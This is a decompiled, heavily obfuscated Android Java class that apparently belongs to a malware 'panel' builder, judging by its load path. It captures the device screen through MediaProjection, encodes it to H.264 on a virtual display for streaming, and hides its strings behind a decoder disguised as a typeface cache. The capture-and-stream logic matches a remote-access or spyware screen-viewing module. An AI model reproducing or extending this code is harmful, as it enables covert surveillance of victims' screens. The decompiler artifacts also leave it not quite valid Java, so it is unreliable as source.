package v.s;

import android.hardware.display.VirtualDisplay;
import android.media.MediaCodec;
import android.media.MediaCrypto;
import android.media.MediaFormat;
import android.media.projection.MediaProjection;
import android.os.Bundle;
import android.view.Surface;
import app.mobilex.plus.util.TypefaceCache;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class x1G2i7KvSdxo3fp {
    public static volatile x1G2i7KvSdxo3fp gmNWMfvn6zlEj;
    public MediaCodec Ee8d2j4S9Vm5yGuR;
    public final int JXn4Qf7zpnLjP5;
    public Thread b1EoSIRjJHO5;
    public final MediaProjection dDIMxZXP1V8HdM;
    public VirtualDisplay ibVTtJUNfrGYbW;
    public final int vekpFI4d1Nc4fakF;
    public final int w9sT1Swbhx3hs;
    public Surface xDyLpEZyrcKVe0;
    public final AtomicBoolean pyu8ovAipBTLYAiKab = new AtomicBoolean(false);
    public final ConcurrentLinkedQueue D5P1xCAyuvgF = new ConcurrentLinkedQueue();
    public final AtomicInteger hjneShqpF9Tis4 = new AtomicInteger(0);

    static {
        TypefaceCache.obtain("000000770058008F00F5009300F50090002C00640050008200E2");
    }

    public x1G2i7KvSdxo3fp(MediaProjection mediaProjection, int i, int i2, int i3) {
        this.dDIMxZXP1V8HdM = mediaProjection;
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = i2;
        this.JXn4Qf7zpnLjP5 = i3;
    }

    private static /* synthetic */ void jews() {
    }

    public final void JXn4Qf7zpnLjP5() {
        if (this.pyu8ovAipBTLYAiKab.getAndSet(false)) {
            gmNWMfvn6zlEj = null;
            Thread thread = this.b1EoSIRjJHO5;
            if (thread != null) {
                thread.interrupt();
            }
            this.b1EoSIRjJHO5 = null;
            dDIMxZXP1V8HdM();
            TypefaceCache.obtain("001000620054009700E000BA00D600EB006300720049008800E000AF00D700A3007E");
            this.hjneShqpF9Tis4.get();
        }
    }

    public final void dDIMxZXP1V8HdM() {
        try {
            VirtualDisplay virtualDisplay = this.ibVTtJUNfrGYbW;
            if (virtualDisplay != null) {
                virtualDisplay.release();
            }
        } catch (Exception unused) {
        }
        this.ibVTtJUNfrGYbW = null;
        try {
            MediaCodec mediaCodec = this.Ee8d2j4S9Vm5yGuR;
            if (mediaCodec != null) {
                mediaCodec.signalEndOfInputStream();
            }
            MediaCodec mediaCodec2 = this.Ee8d2j4S9Vm5yGuR;
            if (mediaCodec2 != null) {
                mediaCodec2.stop();
            }
            MediaCodec mediaCodec3 = this.Ee8d2j4S9Vm5yGuR;
            if (mediaCodec3 != null) {
                mediaCodec3.release();
            }
        } catch (Exception unused2) {
        }
        try {
            Surface surface = this.xDyLpEZyrcKVe0;
            if (surface != null) {
                surface.release();
            }
        } catch (Exception unused3) {
        }
        this.xDyLpEZyrcKVe0 = null;
        this.Ee8d2j4S9Vm5yGuR = null;
        this.D5P1xCAyuvgF.clear();
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r2v1, types: [boolean, int] */
    public final boolean vekpFI4d1Nc4fakF(int i, int i2) {
        ?? r2 = (-58) + 59;
        if (this.pyu8ovAipBTLYAiKab.get()) {
            return r2;
        }
        try {
            int i3 = i - (i % 2);
            int i4 = (int) (i3 * (this.vekpFI4d1Nc4fakF / this.w9sT1Swbhx3hs));
            int i5 = i4 - (i4 % 2);
            MediaFormat mediaFormatCreateVideoFormat = MediaFormat.createVideoFormat("video/avc", i3, i5);
            mediaFormatCreateVideoFormat.setInteger("bitrate", i2);
            mediaFormatCreateVideoFormat.setInteger("frame-rate", 30);
            mediaFormatCreateVideoFormat.setInteger("i-frame-interval", 2);
            mediaFormatCreateVideoFormat.setInteger("color-format", 2130708361);
            mediaFormatCreateVideoFormat.setInteger("profile", r2);
            mediaFormatCreateVideoFormat.setInteger("level", 512);
            mediaFormatCreateVideoFormat.setInteger("latency", 0);
            MediaCodec mediaCodecCreateEncoderByType = MediaCodec.createEncoderByType("video/avc");
            mediaCodecCreateEncoderByType.configure(mediaFormatCreateVideoFormat, (Surface) null, (MediaCrypto) null, (int) r2);
            this.xDyLpEZyrcKVe0 = mediaCodecCreateEncoderByType.createInputSurface();
            mediaCodecCreateEncoderByType.start();
            this.Ee8d2j4S9Vm5yGuR = mediaCodecCreateEncoderByType;
            this.ibVTtJUNfrGYbW = this.dDIMxZXP1V8HdM.createVirtualDisplay(TypefaceCache.obtain("002B006000550084"), i3, i5, this.JXn4Qf7zpnLjP5, 16, this.xDyLpEZyrcKVe0, new luaqjdyAZfxbSO5UD(0, this), null);
            this.pyu8ovAipBTLYAiKab.set(r2);
            gmNWMfvn6zlEj = this;
            Thread thread = new Thread(new hzCVl0f866ksvpzUUql(0, this), TypefaceCache.obtain("002B00600055008400BD00BB00C000A6002A0078"));
            thread.start();
            this.b1EoSIRjJHO5 = thread;
            TypefaceCache.obtain("00100062005A009500E400BA00D600E7");
            TypefaceCache.obtain("00630056001B");
            TypefaceCache.obtain("00280074004B009400BC00FF");
            TypefaceCache.obtain("00250066004800C700B800AC00C000A40063");
            return r2;
        } catch (Exception e) {
            TypefaceCache.obtain("00100062005A009500E400FF00D400A6002A007A005E008300AA00FF");
            e.getMessage();
            dDIMxZXP1V8HdM();
            return false;
        }
    }

    public final void w9sT1Swbhx3hs() {
        try {
            Bundle bundle = new Bundle();
            bundle.putInt("request-sync", 0);
            MediaCodec mediaCodec = this.Ee8d2j4S9Vm5yGuR;
            if (mediaCodec != null) {
                mediaCodec.setParameters(bundle);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00310073004A009200F500AC00C6008C0026006F005D009500F100B200D700FD0063");
            e.getMessage();
        }
    }
}
